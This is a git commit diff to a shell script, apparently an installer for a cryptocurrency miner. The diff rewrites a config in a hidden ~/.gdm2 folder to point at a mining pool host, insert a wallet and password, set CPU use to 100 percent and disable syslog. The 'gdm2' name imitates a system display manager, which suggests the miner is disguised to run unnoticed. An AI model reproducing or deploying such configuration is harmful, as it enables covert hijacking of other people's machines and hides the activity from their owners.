9b9a9e4dd02b7834fdb5e22b3168c9f067cee355
littlAcen <113854209+littlAcen@users.noreply.github.com>
2023-03-24 21:49:45 +0100

    Update setup-gdm2-mo.sh

--- setup-gdm2-mo.sh
+++ setup-gdm2-mo.sh
@@ -230,9 +230,9 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": "littlAcen.selfhost.tk:3333",/"url": "littlAcen.selfhost.tk:4444",/' $HOME/.gdm2/config.json
+sed -i 's/"url": *"[^"]*",/"url": "littlAcen.selfhost.tk:4444",/' $HOME/.gdm2/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
-sed -i 's/"pass": "hv",/"pass": "littlAcen@24-mail.com",/' $HOME/.gdm2/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2/config.json
 sed -i 's/"enabled": false,/"enabled": true,/' $HOME/.gdm2/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.gdm2/config.json
